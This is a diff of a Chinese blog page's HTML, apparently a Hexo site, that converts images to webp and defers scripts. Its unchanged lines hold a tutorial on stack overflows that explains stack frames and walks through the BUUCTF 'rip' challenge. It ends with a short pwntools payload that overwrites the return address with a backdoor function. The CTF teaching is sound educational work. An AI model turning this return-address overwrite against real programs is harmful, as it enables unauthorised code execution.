@@ -24,7 +24,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   
   
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
   
   
     <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
@@ -42,19 +42,19 @@
 <meta property="og:site_name" content="淋着雨">
 <meta property="og:description" content="程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：  栈从高地址向低地址生长。 函数调用时形成一个栈帧（Stack Frame）。 向栈中写入数据是按低地址到高地址的方向。  函数调用时栈的变化32位架构下的寄存器包括 eax、ebx、esp、ebp 等；64位架构下的寄存器名称略有不同，包括 rdi、rsi、rdx、r">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image2.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image3.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image5.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image4.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image6.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image2.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image3.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image5.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image4.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image6.webp">
 <meta property="article:published_time" content="2026-02-14T14:16:02.000Z">
-<meta property="article:modified_time" content="2026-07-19T09:55:25.339Z">
+<meta property="article:modified_time" content="2026-08-31T14:58:51.533Z">
 <meta property="article:author" content="淋着雨">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="stack">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.png">
+<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.webp">
   
   
   
@@ -69,7 +69,7 @@
   
   
     
-<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous" defer></script>
 
   
   
@@ -106,27 +106,16 @@
   </div>
   </div>
   <script>
-    var time = null;
-    var startLoading = () => {
-      time = Date.now();
-      document.getElementById('loader').classList.remove("loading");
-    }
+    var loaderDone = false;
     var endLoading = () => {
-      if (!time) {
-        document.body.style.overflow = 'auto';
-        document.getElementById('loader').classList.add("loading");
-      } else {
-        if (Date.now() - time > 500) {
-          time = null;
-          document.body.style.overflow = 'auto';
-          document.getElementById('loader').classList.add("loading");
-        } else {
-          setTimeout(endLoading, 500 - (Date.now() - time));
-          time = null;
-        }
-      }
+      if (loaderDone) return;
+      loaderDone = true;
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loading");
     }
-    window.addEventListener('DOMContentLoaded', endLoading);
+    // 优化：加载遮罩改为固定短时长（DOMContentLoaded + 500ms，最多 1.5s），不再被网络请求拖住
+    window.addEventListener('DOMContentLoaded', () => setTimeout(endLoading, 500));
+    setTimeout(endLoading, 1500);
     document.getElementById('loader').addEventListener('click', endLoading);
   </script>
 
@@ -232,7 +221,7 @@
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <img src="/avatar/avatar.webp" loading="lazy" decoding="async" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
 </div>
@@ -316,7 +305,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-02-14T14:16:02.000Z" itemprop="datePublished">2026-02-14</time>
-    <time style="display: none;" id="post-update-time">2026-07-19</time>
+    <time style="display: none;" id="post-update-time">2026-08-31</time>
   </span>
   
 </div>
@@ -349,18 +338,18 @@
 <li>“<strong>mov ebp, esp</strong>”，将ebp指向当前栈顶指针（esp），可以看作形成一个新的栈帧。</li>
 <li>“<strong>sub esp, &lt;立即数&gt;</strong>”，esp 向低地址开辟&lt;立即数&gt;个字节的内存空间。</li>
 </ol>
-<p><img src="image1.png" alt="函数调用栈示意图"></p>
+<p><img src="image1.webp" alt="函数调用栈示意图"></p>
 <h2 id="栈溢出的原因"><a href="#栈溢出的原因" class="headerlink" title="栈溢出的原因"></a>栈溢出的原因</h2><p>了解了栈的特点以及函数调用时栈的变化，可以知道被调函数执行结束后程序执行的下一条指令的地址是由压入的返回地址决定的。由于局部变量通常存放在栈上，如果程序使用了不安全的输入函数（如 gets()），没有对输入长度进行限制，就有可能出现用户输入的数据超过了局部变量所分配的栈空间，超出的数据往高地址继续写入从而覆盖相邻栈空间上的数据。</p>
 <p>如果程序中存在后门函数或者攻击者已经控制了某个地址，攻击者计算好输入点到返回地址的距离（也就是偏移量 offset），构造 payload 使得可控制地址恰好在返回地址处发送给程序，就实现了任意代码执行，这便是栈溢出漏洞。</p>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以BUUCTF上的一道入门题“rip”为例。</p>
 <h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>查看程序保护信息，是一个 64 位程序，且没有任何保护。用 ida 打开，查看 main 函数，可以看到，定义了一个变量 s，距离栈底 0xF 也就是 15 字节；同时发现存在危险输入函数<code>gets()</code>，用来给 s 赋值。</p>
-<p><img src="image2.png" alt="main函数"></p>
+<p><img src="image2.webp" alt="main函数"></p>
 <p>翻阅左边的段表，有一个可疑函数<code>fun()</code>，果不其然是一个后门函数。查看后门函数地址。</p>
-<p><img src="image3.png" alt="后门函数"></p>
-<p><img src="image5.png" alt="后门函数地址"></p>
+<p><img src="image3.webp" alt="后门函数"></p>
+<p><img src="image5.webp" alt="后门函数地址"></p>
 <p>查看汇编代码，可以看到有压栈操作，所以填充完s后还需要再覆盖 rbp。需要注意的是，64 位架构下，调用 system() 时如果堆栈不平衡会报错，所以我们需要在调用后门函数前添加一个<code>ret</code>片段来平衡堆栈（在配置了 ROPgadget 的 Linux 系统中执行<code>ROPgadget --binary &lt;ELF文件&gt; only &quot;ret&quot;</code>查找elf文件中的 ret 片段）。</p>
-<p><img src="image4.png" alt="push rbp"></p>
-<p><img src="image6.png" alt="ret地址"></p>
+<p><img src="image4.webp" alt="push rbp"></p>
+<p><img src="image6.webp" alt="ret地址"></p>
 <h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#pwntool是python中一个用来编写pwn攻击脚本的库</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./&lt;ELF文件&gt;&quot;</span>)  <span class="comment">#打本地</span></span><br><span class="line">r = remote(<span class="string">&quot;IP&quot;</span>，port)  <span class="comment">#打远程靶机</span></span><br><span class="line"></span><br><span class="line">fun = <span class="number">0x401186</span>  <span class="comment">#后门函数地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span> + <span class="number">8</span>) + p64(fun)  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)  <span class="comment">#发送payload并换行</span></span><br><span class="line">p.interactive()  <span class="comment">#切换为交互模式，相当于在Linux系统shell中执行“nc IP port”</span></span><br></pre></td></tr></table></figure>
       
     </div>
@@ -387,7 +376,7 @@
         
           
           
-            <img data-src="/covers/【哲风壁纸】cg美女-CG美女插图.png" data-sizes="auto" alt="ret2shellcode" class="lazyload">
+            <img src="/covers/【哲风壁纸】蝴蝶忍-鬼灭之刃.webp" loading="lazy" decoding="async" alt="ret2shellcode" class="lazyload">
           
         
         <a href="/2026/02/15/ret2shellcode/"></a>
@@ -508,7 +497,7 @@
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <img src="/avatar/avatar.webp" loading="lazy" decoding="async" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
 </div>
@@ -583,9 +572,6 @@
     
     
     
-<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
-
-
 <script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
 
 
@@ -597,7 +583,7 @@
 
 
   
-<script src="../../../../js/aos.js"></script>
+<script src="../../../../js/aos.js" defer></script>
 
   <script>
     var aosInit = () => {
@@ -617,7 +603,7 @@
 
 
 
-<script src="../../../../js/pjax_script.js" data-pjax></script>
+<script src="../../../../js/pjax_script.js" data-pjax defer></script>
 
 
 
@@ -626,10 +612,17 @@
 
 
   
-<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous" defer></script>
 
   <script>
-    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--purple-1)","var(--purple-2)","var(--purple-3)","var(--purple-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--purple-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+    var fireworkInit = () => {
+      window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--purple-1)","var(--purple-2)","var(--purple-3)","var(--purple-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--purple-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', fireworkInit);
+    } else {
+      fireworkInit();
+    }
   </script>
 
 
@@ -655,7 +648,7 @@
           description: "",
           stripContent: "程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：  栈从高地址向低地址生长。 函数调用时形成一个栈帧（Stack Frame）。 向栈中写入数据是按低地址到高地址的方向。  函数调用时栈的变化32位架构下的寄存器包括 eax、ebx、esp、ebp 等；64位架构下的寄存器名称略有不同，包括 rdi、rsi、rdx、rbp 等。 下面用几条汇编指令来展开。  “call &amp;lt;被调函数&amp;gt;”，这条指令相当于“p",
           date: "Sat Feb 14 2026 22:16:02 GMT+0800",
-          updated: "Sun Jul 19 2026 17:55:25 GMT+0800",
+          updated: "Mon Aug 31 2026 22:58:51 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
